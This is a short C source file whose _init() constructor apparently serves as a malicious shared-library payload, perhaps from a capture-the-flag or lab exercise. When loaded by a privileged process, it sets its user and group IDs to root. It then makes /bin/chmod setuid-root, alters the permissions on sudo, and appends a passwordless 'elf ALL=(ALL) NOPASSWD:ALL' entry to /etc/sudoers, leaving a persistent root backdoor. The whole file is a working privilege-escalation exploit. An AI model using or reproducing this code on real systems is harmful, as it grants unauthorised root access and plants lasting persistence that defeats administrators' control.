#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  FILE* sudoers;

  // Don't want subsequent PyInstaller binaries to break
  unsetenv("_MEIPASS2");

  // Escalate to root
  setgid(0);
  setuid(0);

  // Fix restricted permissions
  chmod("/usr/bin/sudo", 04111);

  // Make chmod setuid-root
  chmod("/bin/chmod", 04755);

  // Add ourselves to /etc/sudoers
  char* line = "elf ALL=(ALL) NOPASSWD:ALL\n";
  chmod("/etc/sudoers", 0666);

  sudoers = fopen("/etc/sudoers", "a");
  fwrite(line, sizeof(char), strlen(line), sudoers);
  fclose(sudoers);

  // sudo won't run without correct permissions
  chmod("/etc/sudoers", 0444);
}
